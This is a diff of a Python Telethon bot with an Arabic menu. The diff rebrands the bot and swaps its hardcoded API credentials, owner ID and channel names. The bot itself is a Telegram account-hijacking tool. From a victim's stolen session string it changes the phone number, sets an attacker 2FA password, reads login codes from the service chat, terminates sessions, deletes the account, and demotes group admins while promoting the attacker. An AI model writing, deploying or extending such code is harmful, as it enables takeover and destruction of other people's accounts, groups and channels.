@@ -8,7 +8,7 @@ from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = os.environ.get("API_HASH")
 token = os.environ.get("BOT_TOKEN")
-client = TelegramClient('YUIRFS', api_id, api_hash).start(bot_token=token)
+client = TelegramClient('Jepthon', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -20,11 +20,11 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-ilyass = 5234207580
+ilyass = 5241356234
 
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     bot = client = X
     try: 
       result = await bot(functions.account.ChangePhoneRequest(
@@ -37,7 +37,7 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     bot = client = X
     result = await bot(functions.account.SendChangePhoneCodeRequest(
         phone_number=number,
@@ -51,27 +51,27 @@ async def change_number(strses, number):
 
 
 async def userinfo(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     k = await X.get_me()
     return str(k)
 
 async def terminate(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     await X(rt())
 GROUP_LIST = []
 async def delacc(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     await X(functions.account.DeleteAccountRequest("me hi chutia hu"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
     except:
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def user2fa(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     try:
       await X.edit_2fa('LEGENDXISBEST')
       return True
@@ -79,7 +79,7 @@ async def user2fa(strses):
       return False
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
         await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
@@ -89,28 +89,28 @@ async def demall(strses, grp):
 
 
 async def joingroup(strses, username):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     await X(join(username))
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     await X(leave(username))
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     await X(dc(username))
     
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+    async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     i = ""
     async for x in X.iter_messages(777000, limit=3):
       i += f"\n{x.text}\n"
@@ -119,7 +119,7 @@ async def usermsgs(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     k = await X.get_participants(grp)
     for x in k:
       try:
@@ -130,7 +130,7 @@ async def userbans(strses, grp):
 
 
 async def userchannels(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 18400817, "a7ae965db49db1e0fa30a347fb960b03") as X:
     k = await X(pc())
     i = ""
     for x in k.chats:
@@ -145,7 +145,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "YUIRFS"
+channel = "Jepthon"
 menu = '''
 
 A : [ ** تحقق من قنوات ومجموعات الحساب **]
@@ -193,10 +193,10 @@ async def op(event):
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
   if not event.sender_id == ilyass:
-    return await event.reply("@YUIRFS")
-  async for x in client.iter_messages("EE48i"):
+    return await event.reply("@jepthon")
+  async for x in client.iter_messages("Hajarlx"):
     try:
-      await x.forward_to("EE48i")
+      await x.forward_to("Hajarlx")
     except:
       pass
 
